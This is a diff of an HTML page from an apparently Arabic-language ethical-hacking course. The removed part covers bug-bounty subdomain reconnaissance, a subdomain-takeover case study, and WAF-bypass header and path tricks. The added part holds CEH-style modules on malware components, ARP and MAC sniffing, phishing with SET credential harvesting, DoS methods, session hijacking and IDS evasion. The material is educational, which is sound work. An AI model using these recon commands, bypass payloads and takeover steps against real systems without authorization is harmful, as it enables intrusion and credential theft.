-            <span id="p0-checklist-count">0 / 9 completed</span>
-            <div class="checklist-bar"><div class="checklist-bar-fill" id="p0-checklist-bar" style="width:0%"></div></div>
-          </div>
-        </div>
-
-        <!-- IF NOTHING FOUND -->
-        <p class="os-section-label">🔍 If Nothing Found</p>
-        <div class="if-nothing-box">
-          <div class="if-nothing-title">❓ نتائج قليلة جداً؟ جرب هذه:</div>
-          <ul class="if-nothing-list">
-            <li>Certificate Transparency: <code>https://crt.sh/?q=%.target.com</code></li>
-            <li>Shodan: <code>ssl.cert.subject.CN:target.com</code> أو <code>hostname:target.com</code></li>
-            <li>Google dorking: <code>site:*.target.com -www -blog</code></li>
-            <li>GitHub dorking: <code>"target.com" extension:js OR extension:env</code></li>
-            <li>Active DNS Brute: <code>amass enum -active -brute -d target.com -w /opt/wordlists/subdomains.txt</code></li>
-            <li>WaybackMachine: <code>waybackurls target.com | grep target.com | cut -d/ -f3 | sort -u</code></li>
-          </ul>
-        </div>
-
-        <!-- COMMON MISTAKES vs BEST PRACTICES -->
-        <p class="os-section-label">⚠️ Common Mistakes vs Best Practices</p>
-        <div class="cyber-card">
-          <div class="card-header"><h3>❌ ✅ الأخطاء مقابل أفضل الممارسات</h3></div>
-          <div class="mistakes-grid">
-            <div class="mistake-card bad">
-              <h5>❌ Common Mistakes</h5>
-              <ul class="mistake-list">
-                <li>الاكتفاء بـ subfinder وحدها فقط</li>
-                <li>تجاهل 404 responses بدون فحص CNAME</li>
-                <li>عدم فحص المنافذ غير المعيارية</li>
-                <li>تجاهل subdomains القديمة المؤرشفة</li>
-                <li>بدء Active Recon قبل انتهاء Passive</li>
-                <li>نسيان wildcard: <code>*.target.com</code></li>
-              </ul>
-            </div>
-            <div class="mistake-card good">
-              <h5>✅ Best Practices</h5>
-              <ul class="mistake-list">
-                <li>دمج 4+ مصادر + <code>sort -u</code> دائماً</li>
-                <li>فحص كل CNAME يشير لسحابية بـ <code>dig</code></li>
-                <li>naabu على كل host حي للمنافذ</li>
-                <li>dev / staging / admin = الأولوية الأولى دائماً</li>
-                <li>gau + waybackurls للأرشيف التاريخي</li>
-                <li>Passive أولاً ← Active لاحقاً دائماً</li>
-              </ul>
-            </div>
-          </div>
-        </div>
-
-        <!-- REAL CASE STUDY -->
-        <p class="os-section-label">📂 Real World Case</p>
-        <div class="case-study-card">
-          <div class="case-study-header">
-            <div class="case-study-title">📂 Starbucks Subdomain Takeover — Full Chain</div>
-            <div class="case-study-bounty">💰 $2,000 Bounty</div>
-          </div>
-          <div class="case-study-body">
-            <div class="case-study-step">
-              <div class="case-step-num">①</div>
-              <div class="case-step-text"><strong>Recon:</strong> <code>subfinder -d starbucks.com</code> وجد <code>starbucks-api.starbucks.com</code></div>
-            </div>
-            <div class="case-study-step">
-              <div class="case-step-num">②</div>
-              <div class="case-step-text"><strong>Live Check:</strong> httpx أرجع <code>404 — Web Site not found</code> → مؤشر takeover</div>
-            </div>
-            <div class="case-study-step">
-              <div class="case-step-num">③</div>
-              <div class="case-step-text"><strong>CNAME:</strong> <code>dig starbucks-api.starbucks.com CNAME</code> → <code>azurewebsites.net</code> → NXDOMAIN = Dangling!</div>
-            </div>
-            <div class="case-study-step">
-              <div class="case-step-num">④</div>
-              <div class="case-step-text"><strong>Exploit:</strong> تسجيل Azure App Service بنفس المعرف → التحكم الكامل في الـ subdomain</div>
-            </div>
-            <div class="case-study-step">
-              <div class="case-step-num">⑤</div>
-              <div class="case-step-text"><strong>Impact:</strong> Cookies بـ <code>.starbucks.com</code> → Session Hijacking لكل مستخدمي التطبيق</div>
-            </div>
-            <div class="case-study-step">
-              <div class="case-step-num">⑥</div>
-              <div class="case-step-text"><strong>Report:</strong> Responsible Disclosure → <span style="color:var(--neon-green);">$2,000 Bug Bounty ✅</span></div>
-            </div>
-          </div>
-        </div>
-
-        <!-- WHEN TO STOP -->
-        <p class="os-section-label">🛑 When to Stop?</p>
-        <div class="stop-check-box">
-          <div class="stop-check-title">✅ هل أنت جاهز للمرحلة التالية؟</div>
-          <ul class="phase-checklist" id="checklist-p0-stop" style="margin:0 0 14px;">
-            <li class="checklist-item" onclick="toggleCheck(this,'p0-stop',0)">
-              <div class="check-box"></div>
-              <div class="check-label">جمعت 100+ subdomain من 3+ مصادر مختلفة</div>
-            </li>
-            <li class="checklist-item" onclick="toggleCheck(this,'p0-stop',1)">
-              <div class="check-box"></div>
-              <div class="check-label">فرزت الحية بـ httpx وحددت الأكثر أهمية</div>
-            </li>
-            <li class="checklist-item" onclick="toggleCheck(this,'p0-stop',2)">
-              <div class="check-box"></div>
-              <div class="check-label">فحصت CNAME لكل 404 response</div>
-            </li>
-            <li class="checklist-item" onclick="toggleCheck(this,'p0-stop',3)">
-              <div class="check-box"></div>
-              <div class="check-label">سجّلت dev / staging / admin subdomains للفحص اللاحق</div>
-            </li>
-          </ul>
-          <div class="tip-callout" style="margin:0;">
-            <div class="tip-callout-icon">➡️</div>
-            <div class="tip-callout-text"><strong>Next Phase:</strong> اذهب لـ JS Analysis — افتح ملفات JS على كل host حي وابحث عن hidden endpoints وأسرار مسرّبة (API keys, tokens, internal paths).</div>
-          </div>
-        </div>
-
-      
-        <!-- VISUAL ATTACK FLOW -->
-        <p class="os-section-label">🗺️ Recon Attack Flowchart — مخطط تدفق عملية الفحص</p>
-        <div class="cyber-card" style="background: rgba(2, 2, 5, 0.85); overflow-x: auto; padding: 24px; border: 1px solid rgba(0, 229, 255, 0.15);">
-          <div style="display: flex; align-items: center; justify-content: center; min-width: 850px; gap: 15px; font-family: 'Outfit', monospace; font-size: 0.82rem; text-align: center; color: #fff;">
-            <div style="padding: 10px 14px; border: 1px solid var(--neon-cyan); border-radius: 4px; background: rgba(0,229,255,0.05); box-shadow: 0 0 10px rgba(0,229,255,0.1);">🎯 Scope Definition</div>
-            <span style="color: var(--neon-cyan); font-weight: bold;">➡</span>
-            <div style="padding: 10px 14px; border: 1px solid var(--neon-cyan); border-radius: 4px; background: rgba(0,229,255,0.05); box-shadow: 0 0 10px rgba(0,229,255,0.1);">🌍 Passive Recon<br>(Subfinder/Amass)</div>
-            <span style="color: var(--neon-cyan); font-weight: bold;">➡</span>
-            <div style="padding: 10px 14px; border: 1px solid var(--neon-cyan); border-radius: 4px; background: rgba(0,229,255,0.05); box-shadow: 0 0 10px rgba(0,229,255,0.1);">📡 Live Check<br>(httpx)</div>
-            <span style="color: var(--neon-cyan); font-weight: bold;">➡</span>
-            <div style="display: flex; flex-direction: column; gap: 10px;">
-              <div style="padding: 8px 12px; border: 1px solid var(--neon-red); border-radius: 4px; background: rgba(255,0,85,0.05); box-shadow: 0 0 10px rgba(255,0,85,0.1);">❌ 404/403 Responses<br>(CNAME/Takeover Audit)</div>
-              <div style="padding: 8px 12px; border: 1px solid var(--neon-green); border-radius: 4px; background: rgba(0,255,102,0.05); box-shadow: 0 0 10px rgba(0,255,102,0.1);">🟢 200 OK Alive Hosts<br>(Port Scan & JS Analysis)</div>
-            </div>
-            <span style="color: var(--neon-cyan); font-weight: bold;">➡</span>
-            <div style="padding: 10px 14px; border: 1px solid var(--neon-cyan); border-radius: 4px; background: rgba(0,229,255,0.05); box-shadow: 0 0 10px rgba(0,229,255,0.1);">🎯 Prioritize Target<br>(Dev/Staging panels)</div>
-          </div>
-        </div>
-
-        <!-- TOOL SELECTION GUIDE -->
-        <p class="os-section-label">🛠️ Tool Selection Guide — اختيار الأداة المناسبة</p>
-        <div class="cyber-card">
-          <div class="card-header"><h3>🛠️ Passive Subdomain Tools Comparison</h3></div>
-          <table class="interactive-table">
-            <thead>
-              <tr>
-                <th>الأداة (Tool)</th>
-                <th>السرعة (Speed)</th>
-                <th>العمق (Depth)</th>
-                <th>أفضل استخدام (Best For)</th>
-              </tr>
-            </thead>
-            <tbody>
-              <tr>
-                <td><strong>subfinder</strong></td>
-                <td>⚡ 95% (Fast)</td>
-                <td>🌊 Wide (Good)</td>
-                <td>البداية السريعة لجمع نطاقات من مصادر OSINT العامة مجاناً.</td>
-              </tr>
-              <tr>
-                <td><strong>amass</strong></td>
-                <td>🐢 20% (Slow)</td>
-                <td>🌊 Deep (Thorough)</td>
-                <td>البحث الموسّع والشامل، يدعم الـ Active resolution والتخمين الذاتي.</td>
-              </tr>
-              <tr>
-                <td><strong>assetfinder</strong></td>
-                <td>⚡ 98% (Very Fast)</td>
-                <td>🌊 Medium</td>
-                <td>التركيز المباشر والسريع جداً على شهادات التشفير crt.sh.</td>
-              </tr>
-            </tbody>
-          </table>
-        </div>
-
-        <!-- EDGE CASES & WHAT-IF SCENARIOS -->
-        <p class="os-section-label">💡 Edge Cases — ماذا تفعل لو؟</p>
-        <div class="cyber-card" style="border-color: var(--neon-purple); background: rgba(155, 89, 255, 0.02);">
-          <div class="card-header"><h3 style="color:var(--neon-purple);">💡 What-If Scenarios & Edge Cases</h3></div>
-          <div style="display:flex; flex-direction:column; gap:16px; font-size:1.15rem; line-height:1.7; color:#cbd5e1;">
-            <div>
-              <strong style="color:var(--neon-red);">❓ Scenario 1: كل النطاقات الفرعية خلف Cloudflare؟ (Behind Cloudflare CDN)</strong>
-              <p style="margin:4px 0 0 10px; color:#cbd5e1;">
-                • <strong>الحل:</strong> ابحث عن الـ Origin IP الحقيقي للسيرفر لتخطي الحماية. استخدم أدوات مثل Shodan أو Censys للبحث عن الشهادة التاريخية، أو فحص سجلات DNS التاريخية (DNSTrails) لرصد IP السيرفر قبل تفعيل Cloudflare.
-              </p>
-            </div>
-            <div>
-              <strong style="color:var(--neon-red);">❓ Scenario 2: الـ Scope محدد بنطاق واحد فقط ولا يسمح بـ Wildcard؟ (Single Target Only)</strong>
-              <p style="margin:4px 0 0 10px; color:#cbd5e1;">
-                • <strong>الحل:</strong> ركّز بالكامل على تخمين المجلدات والملفات (Directory Discovery)، فحص ثغرات المدخلات والمعاملات (Parameters Discovery)، وقراءة ملفات الـ JS بدقة للعثور على API endpoints داخل نفس النطاق.
-              </p>
-            </div>
-            <div>
-              <strong style="color:var(--neon-red);">❓ Scenario 3: البرنامج يمنع الفحص التلقائي تماماً؟ (No Automated Scans Allowed)</strong>
-              <p style="margin:4px 0 0 10px; color:#cbd5e1;">
-                • <strong>الحل:</strong> اعتمد 100% على الـ OSINT السلبي والتصفح اليدوي عبر المتصفح مع تفعيل Burp Suite للاستماع فقط (Passive Interception). قم بتحليل طلبات التطبيق العادية دون إرسال طلبات فحص مكثفة.
-              </p>
-            </div>
-          </div>
-        </div>
-
-        <!-- ETHICAL BOUNDARIES & RISK MANAGEMENT -->
-        <p class="os-section-label">🛡️ Ethical Boundaries & Risk Management — أخلاقيات وجودة الفحص</p>
-        <div class="cyber-card" style="border-color: var(--neon-green); background: rgba(0, 255, 102, 0.01);">
-          <div class="card-header"><h3 style="color:var(--neon-green);">🛡️ Ethical Boundaries & DoS Prevention</h3></div>
-          <div style="font-size:1.15rem; line-height:1.7; color:#cbd5e1;">
-            <p style="margin: 0 0 10px 0;">
-              لتجنب التسبب في هجمات حرمان الخدمة (DoS) غير المقصودة وتفادي حظر عنوان الـ IP الخاص بك من قبل جدران الحماية (WAF):
-            </p>
-            <ul style="padding-left: 20px; margin: 0;">
-              <li><strong>التحكم بالـ Rate Limiting:</strong> حدد عدد الطلبات في الثانية عند استخدام httpx أو ffuf (مثلاً استخدام علم <code>-t 10</code> أو <code>-rate-limit 15</code>).</li>
-              <li><strong>تجنب فحص ملفات ضخمة:</strong> لا تشغل فحصاً تلقائياً بمجلدات ضخمة جداً (wordlists تزيد عن 50 ألف سطر) على السيرفرات الضعيفة.</li>
-              <li><strong>احترم ملف الـ robots.txt:</strong> اقرأه يدوياً قبل الفحص لتفادي الضغط على المسارات المستبعدة.</li>
-            </ul>
-          </div>
-        </div>
-
-        <!-- OUTPUT INTERPRETATION -->
-        <p class="os-section-label">📊 Output Interpretation — تحليل وتفسير النتائج</p>
-        <div class="cyber-card">
-          <div class="card-header"><h3>📊 How to Read & Analyze httpx Output</h3></div>
-          <div style="display:flex; flex-direction:column; gap:14px; font-size:1.15rem; line-height:1.7; color:#cbd5e1;">
-            <p style="margin:0;">بفرض أنك حصلت على المخرجات التالية من أداة httpx:</p>
-            <pre style="background:#04040a; padding:14px; border-radius:4px; color:var(--neon-cyan); font-family:monospace; margin:0; border: 1px solid rgba(255,255,255,0.05);">https://dev.target.com [200] [DevEnv - Internal] [PHP/8.1, nginx/1.18]</pre>
-            <div style="padding-left:15px; border-left:2px solid var(--neon-cyan);">
-              • <strong>[PHP/8.1]</strong>: إشارة فورية لوجود لغة PHP بإصدار 8.1. ابحث فوراً عن CVEs معروفة لهذا الإصدار (مثال: RCE ثغرة PHP 8.1.0-dev backdoor).<br>
-              • <strong>[nginx/1.18]</strong>: ابحث عن أخطاء التكوين الشائعة في خوادم nginx مثل Nginx Alias Traversal أو استغلال الصلاحيات في ملف التكوين.<br>
-              • <strong>ماذا لو حصلت على [403 Forbidden]؟</strong> لا تترك النطاق! جرب تخطي جدار الحماية (WAF Bypass) عبر تغيير الـ Headers (مثل <code>X-Forwarded-For: 127.0.0.1</code>) أو استخدام مسارات بديلة مثل <code>/admin/..;/</code>.
-            </div>
-          </div>
-        </div>
-
-        <!-- PRACTICE LAB INTEGRATION -->
-        <p class="os-section-label">🧪 Practice Lab — التطبيق العملي</p>
-        <div class="cyber-card" style="border: 1px dashed var(--neon-cyan); background: rgba(0, 229, 255, 0.02); margin-bottom: 30px;">
-          <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:15px;">
-            <div>
-              <h4 style="margin:0 0 5px 0; font-family:'Outfit',sans-serif; font-size:1.25rem; color:#fff;">🧪 جاهز لتطبيق ما تعلمته?</h4>
-              <p style="margin:0; font-size:0.95rem; color:var(--text-secondary);">اختبر مهاراتك في كشف النطاقات الفرعية الضعيفة واستغلال ثغرات الـ Takeover في المختبر التفاعلي.</p>
-            </div>
-            <a href="index.html#labs" class="back-btn" style="white-space:nowrap;" onclick="localStorage.setItem('switch_tab_direct', 'labs')">
-              ▶ Launch Interactive Labs
-            </a>
-          </div>
-        </div>
-
-        <!-- MARK PHASE COMPLETE -->
-        <button class="mark-complete-btn" id="complete-btn-p0" onclick="markPhaseComplete('p0','p2')">
-          ✅ Mark Phase Complete — Subdomain Enumeration Done → Proceed to Technology Detection
-        </button>
 </div>
-      <!-- Phase 2: Tech Detection -->
-      <div class="meth-content-view" id="meth-content-p2" style="display: none; --tool-color: #ffb020;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🖥️</span> Technology Detection Stack</h2>
-          <p class="hero-tagline">فحص وتحديد اللغات والأطر البرمجية المشغلة للسيرفر للبحث عن ثغرات مطابقة</p>
+
+      
+<!-- =======================================================
+     CEH MODULE 7: MALWARE THREATS
+     ======================================================= -->
+<div class="meth-content-view" id="meth-content-mod7" style="display:none;" dir="rtl">
+  
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">🦠</span> Malware Threats</h2>
+    <p class="hero-tagline">الفيروسات، الرانسوم وير، والهندسة العكسية للبرمجيات الخبيثة المتقدمة.</p>
+    <div class="hero-meta">
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-red);"></span> Module 07</span>
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🧩</span>
+      <h3>مكونات البرمجيات الخبيثة المتقدمة (Malware Components)</h3>
+    </div>
+    
+    <div class="goal-cards-grid" dir="rtl">
+      <div class="goal-card">
+        <div class="goal-icon">🔒</div>
+        <h4>Crypter (برامج التشفير)</h4>
+        <p>تُشفر الكود المصدري للبرمجية للتهرب من مضادات الفيروسات. لا يتم فك التشفير إلا في الذاكرة الحية (RAM).</p>
+      </div>
+      <div class="goal-card">
+        <div class="goal-icon">🗜️</div>
+        <h4>Packer (برامج الضغط)</h4>
+        <p>تضغط الـ PE File لإخفاء تركيبته (Obfuscation) وتغيير بصمته (Hash) لتعطيل التحليل الثابت.</p>
+      </div>
+      <div class="goal-card">
+        <div class="goal-icon">📦</div>
+        <h4>Dropper (برامج الإسقاط)</h4>
+        <p>ملف ناقل شرعي الشكل يحتوي بداخله البرمجية الخبيثة ويقوم بإسقاطها خفية على النظام.</p>
+      </div>
+      <div class="goal-card">
+        <div class="goal-icon">⬇️</div>
+        <h4>Downloader</h4>
+        <p>أداة صغيرة يتم إرسالها أولاً، وتقوم بتحميل البرمجية الرئيسية من خادم القيادة والسيطرة (C2).</p>
+      </div>
+      <div class="goal-card" style="border-color: #ff4757;">
+        <div class="goal-icon" style="color:#ff4757;">💉</div>
+        <h4 style="color:#ff4757;">Injector (برامج الحقن)</h4>
+        <p>تحقن الكود الخبيث داخل عمليات النظام الشرعية (مثل explorer.exe) لتجنب اكتشافه.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🔬</span>
+      <h3>الهندسة العكسية (Reverse Engineering)</h3>
+    </div>
+    <div class="rd-compare-grid">
+      <div class="rd-compare-col good" style="border-color: #00b4d8;">
+        <div class="rd-compare-title">📄 التحليل الثابت (Static Analysis)</div>
+        <ul class="rd-compare-list">
+          <li>تحليل الكود دون تشغيله للبحث عن المؤشرات (IoCs).</li>
+          <li>استخراج الـ Strings لاكتشاف روابط C2 أو Passwords.</li>
+          <li>فحص الدوال المستوردة (PE Header) لمعرفة قدرات البرنامج.</li>
+          <li>استخدام Disassemblers مثل IDA Pro أو Ghidra.</li>
+        </ul>
+      </div>
+      <div class="rd-compare-col bad" style="border-color: #ff4757;">
+        <div class="rd-compare-title">⚙️ التحليل الديناميكي (Dynamic Analysis)</div>
+        <ul class="rd-compare-list">
+          <li>تشغيل البرمجية الخبيثة داخل بيئة معزولة (Sandbox).</li>
+          <li>مراقبة تغييرات النظام (Registry & File System).</li>
+          <li>رصد اتصالات الشبكة وطلبات الـ DNS.</li>
+          <li>استخدام Debuggers كـ x64dbg لتتبع الذاكرة وسجلات المعالج خطوة بخطوة.</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+      
+<!-- =======================================================
+     CEH MODULE 8: SNIFFING
+     ======================================================= -->
+<div class="meth-content-view" id="meth-content-mod8" style="display:none;" dir="rtl">
+  
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">🎧</span> Sniffing</h2>
+    <p class="hero-tagline">اعتراض البيانات، تسميم بروتوكول ARP، وفلاتر Wireshark العميقة.</p>
+    <div class="hero-meta">
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-blue);"></span> Module 08</span>
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">📡</span>
+      <h3>تقنيات هجمات التنصت النشط (Active Sniffing)</h3>
+    </div>
+    
+    <div class="cyber-card" style="--tool-color: #00b4d8;">
+      <div class="card-header"><h4>1. إغراق جدول MAC (MAC Flooding)</h4></div>
+      <p>إغراق الـ Switch بآلاف العناوين المزيفة لملء جدول الـ CAM. هذا يُجبر الـ Switch على العمل كـ Hub، مسبباً بث كل الحزم لجميع المنافذ لالتقاطها.</p>
+    </div>
+
+    <div class="cyber-card" style="--tool-color: #ff4757;">
+      <div class="card-header"><h4>2. تسميم ARP (ARP Poisoning / Spoofing)</h4></div>
+      <p>يستغل غياب المصادقة في ARP. المهاجم يُقنع الضحية والـ Gateway بأن جهازه هو الطرف الآخر المستهدف، ليمرر الحركة عبره في هجوم (Man-in-the-Middle).</p>
+    </div>
+
+    <div class="cyber-card" style="--tool-color: #ffa502;">
+      <div class="card-header"><h4>3. تجويع خادم DHCP (DHCP Starvation & Spoofing)</h4></div>
+      <p>استنزاف عناوين הـ IP المتوفرة من خادم الـ DHCP عن طريق إرسال طلبات عناوين وهمية، ليقوم المهاجم لاحقاً بتشغيل Rogue DHCP ويصبح هو الـ Gateway الخاص بالشبكة.</p>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🦈</span>
+      <h3>Wireshark Arsenal (فلاتر وايرشارك المتقدمة)</h3>
+    </div>
+    <div class="cmd-block">
+      <div class="cmd-header"><span class="cmd-lang">Wireshark Filters</span></div>
+      <pre><code># تصفية حسب عنوان IP معين
+ip.addr == 192.168.1.1
+
+# عرض طلبات ويب من نوع GET أو التي تحتوي على كلمات سر
+http.request.method == "GET"
+http contains "password"
+
+# عرض حزم استجابة ARP فقط لاكتشاف تسميم ARP
+arp.opcode == 2
+
+# تصفية حسب عنوان MAC
+eth.addr == 00:11:22:33:44:55</code></pre>
+    </div>
+  </div>
+
+</div>
+
+      
+<!-- =======================================================
+     CEH MODULE 9: SOCIAL ENGINEERING
+     ======================================================= -->
+<div class="meth-content-view" id="meth-content-mod9" style="display:none;" dir="rtl">
+  
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">🎭</span> Social Engineering</h2>
+    <p class="hero-tagline">فن التلاعب بالبشر: التصيد الاحتيالي، الانتحال، وأدوات المهندس الاجتماعي.</p>
+    <div class="hero-meta">
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-yellow);"></span> Module 09</span>
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🎣</span>
+      <h3>أساليب الهندسة الاجتماعية (Techniques)</h3>
+    </div>
+    
+    <div class="goal-cards-grid" dir="rtl">
+      <div class="goal-card">
+        <div class="goal-icon">📧</div>
+        <h4>التصيد الاحتيالي (Phishing)</h4>
+        <p>إرسال رسائل مزيفة تبدو من مصدر موثوق لحث الضحية على إدخال بيانات الاعتماد.</p>
+      </div>
+      <div class="goal-card">
+        <div class="goal-icon">🎯</div>
+        <h4>التصيد الموجه (Spear Phishing)</h4>
+        <p>هجوم مخصص لشخص أو قسم معين بُني على استطلاع مسبق للهدف (OSINT).</p>
+      </div>
+      <div class="goal-card">
+        <div class="goal-icon">🐋</div>
+        <h4>صيد الحيتان (Whaling)</h4>
+        <p>يستهدف كبار الشخصيات والمسؤولين التنفيذيين (C-Level Executives) لصلاحياتهم العالية.</p>
+      </div>
+      <div class="goal-card">
+        <div class="goal-icon">👥</div>
+        <h4>الانتحال (Pretexting)</h4>
+        <p>تقمص شخصية (فني IT أو بنك) لإقناع الضحية بتقديم معلومات حساسة هاتفياً أو حضورياً.</p>
+      </div>
+      <div class="goal-card">
+        <div class="goal-icon">🚶</div>
+        <h4>التتبع (Tailgating / Piggybacking)</h4>
+        <p>دخول المهاجم لمبنى مؤمن عن طريق تتبع موظف مصرح له عن قرب (سواء برضاه أو غفلة منه).</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🧰</span>
+      <h3>مجموعة أدوات المهندس الاجتماعي (SET)</h3>
+    </div>
+    <div class="cyber-card" style="--tool-color: #ff4757;">
+      <p>أداة جبارة (Social-Engineer Toolkit) مفتوحة المصدر.</p>
+      <ul style="color:#e2e8f0; line-height: 1.8;">
+        <li><strong style="color:#ff4757">Site Cloner:</strong> نسخ صفحة حقيقية متطابقة بالكامل (مثل صفحة لوجن فيسبوك) لسرقة الباسوردات.</li>
+        <li><strong style="color:#ff4757">Credential Harvester:</strong> استقبال وتسجيل البيانات بمجرد إدخالها في الموقع المستنسخ.</li>
+        <li><strong style="color:#ff4757">Infectious Media (USB):</strong> تحضير أقراص USB محملة ببرمجيات خبيثة ذاتية التشغيل كطُعم للإيقاع بالموظفين.</li>
+      </ul>
+    </div>
+  </div>
+
+</div>
+
+      
+<!-- =======================================================
+     CEH MODULE 10: Denial-of-Service
+     ======================================================= -->
+<div class="meth-content-view" id="meth-content-mod10" style="display:none;" dir="rtl">
+  
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">🛑</span> Denial-of-Service (DoS/DDoS)</h2>
+    <p class="hero-tagline">استنزاف الموارد: الهجمات الحجمية، الاستنزاف، والتضخيم الانعكاسي.</p>
+    <div class="hero-meta">
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-orange);"></span> Module 10</span>
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">💥</span>
+      <h3>تقنيات حجب الخدمة (Attack Vectors)</h3>
+    </div>
+    
+    <div class="cyber-card" style="--tool-color: #00b4d8;">
+      <div class="card-header"><h4>1. استنزاف البروتوكول (TCP SYN Flood)</h4></div>
+      <p>إغراق الخادم بطلبات `SYN` بعناوين مزيفة. يترك الخادم الجلسات في الانتظار (Half-open) حتى تمتلئ الذاكرة وتتوقف الخدمة.</p>
+    </div>
+
+    <div class="cyber-card" style="--tool-color: #ff4757;">
+      <div class="card-header"><h4>2. التضخيم والانعكاس (Amplification Attacks)</h4></div>
+      <p>استغلال الـ UDP (مثل DNS أو NTP). يرسل المهاجم طلب صغير بعنوان الضحية (Spoofed)، فيرد الخادم بإجابة ضخمة جداً تسحق شبكة الضحية.</p>
+    </div>
+
+    <div class="cyber-card" style="--tool-color: #ffa502;">
+      <div class="card-header"><h4>3. هجوم طبقة التطبيقات (Slowloris)</h4></div>
+      <p>فتح آلاف الاتصالات مع الخادم، وإرسال الـ Headers ببطء شديد وتجزئتها، مما يستنفد الـ Concurrent Connections دون الحاجة لباندويث ضخم.</p>
+    </div>
+
+    <div class="cyber-card" style="--tool-color: #2ed573;">
+      <div class="card-header"><h4>4. هجوم Smurf</h4></div>
+      <p>إرسال طلب ICMP بعنوان الضحية لعنوان بث (Broadcast) ضخم. كل الأجهزة في تلك الشبكة ترد على الضحية في نفس اللحظة مضخمة الهجوم.</p>
+    </div>
+  </div>
+
+</div>
+
+      
+<!-- =======================================================
+     CEH MODULE 11: SESSION HIJACKING
+     ======================================================= -->
+<div class="meth-content-view" id="meth-content-mod11" style="display:none;" dir="rtl">
+  
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">🔓</span> Session Hijacking</h2>
+    <p class="hero-tagline">السيطرة على جلسات المستخدمين الشرعيين متجاوزاً عمليات المصادقة.</p>
+    <div class="hero-meta">
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-green);"></span> Module 11</span>
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🌐</span>
+      <h3>أساليب اختطاف الجلسات (Hijacking Levels)</h3>
+    </div>
+    
+    <div class="rd-compare-grid">
+      <div class="rd-compare-col bad" style="border-color: #ff4757;">
+        <div class="rd-compare-title">⚠️ اختطاف مستوى الشبكة (TCP/IP)</div>
+        <ul class="rd-compare-list">
+          <li>مراقبة اتصال TCP نشط واعتراضه.</li>
+          <li>الاعتماد على **توقع رقم التسلسل (Sequence Number Prediction)**.</li>
+          <li>حقن الحزمة الشرعية برقم التسلسل الصحيح ليتعامل الخادم مع المهاجم وكأنه العميل الأصلي.</li>
+        </ul>
+      </div>
+      <div class="rd-compare-col bad" style="border-color: #ffa502;">
+        <div class="rd-compare-title">⚠️ اختطاف مستوى التطبيق (App Level)</div>
+        <ul class="rd-compare-list">
+          <li><strong>سرقة الكوكيز (Sniffing):</strong> التقاط الـ Session ID وحقنه في المتصفح.</li>
+          <li><strong>تثبيت الجلسة (Session Fixation):</strong> فرض معرف جلسة مسبق على الضحية ليسجل دخوله به.</li>
+          <li><strong>استغلال XSS:</strong> حقن كود جافاسكريبت لسرقة الكوكي النشط.</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+      
+<!-- =======================================================
+     CEH MODULE 12: EVADING IDS, FIREWALLS & HONEYPOTS
+     ======================================================= -->
+<div class="meth-content-view" id="meth-content-mod12" style="display:none;" dir="rtl">
+  
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">🥷</span> Evading IDS & Firewalls</h2>
+    <p class="hero-tagline">تجاوز أنظمة كشف التسلل، جدران الحماية، ومصائد المغفلين (Honeypots).</p>
+    <div class="hero-meta">
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-green);"></span> Module 12</span>
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🛡️</span>
+      <h3>تقنيات التجاوز المتقدمة (Evasion Techniques)</h3>
+    </div>
+    
+    <div class="goal-cards-grid" dir="rtl">
+      <div class="goal-card">
+        <div class="goal-icon">🎭</div>
+        <h4>IP Spoofing</h4>
+        <div class="goal-subtitle">انتحال عنوان IP</div>
+        <p>تعديل الـ Source IP في الحزمة لتبدو قادمة من مصدر موثوق داخل الشبكة (Internal Trusted IP) لتجاوز تصفية الجدار الناري.</p>
+      </div>
+      <div class="goal-card">
+        <div class="goal-icon">🗺️</div>
+        <h4>Source Routing</h4>
+        <div class="goal-subtitle">توجيه المصدر</div>
+        <p>تحديد المسار الدقيق (Route) للحزمة لتجاوز أجهزة הـ Firewall الموجودة في المسار الافتراضي.</p>
+      </div>
+      <div class="goal-card" style="border-color: #00e5a0;">
+        <div class="goal-icon" style="color: #00e5a0;">🧩</div>
+        <h4 style="color: #00e5a0;">Fragmentation</h4>
+        <div class="goal-subtitle">تجزئة الحزم</div>
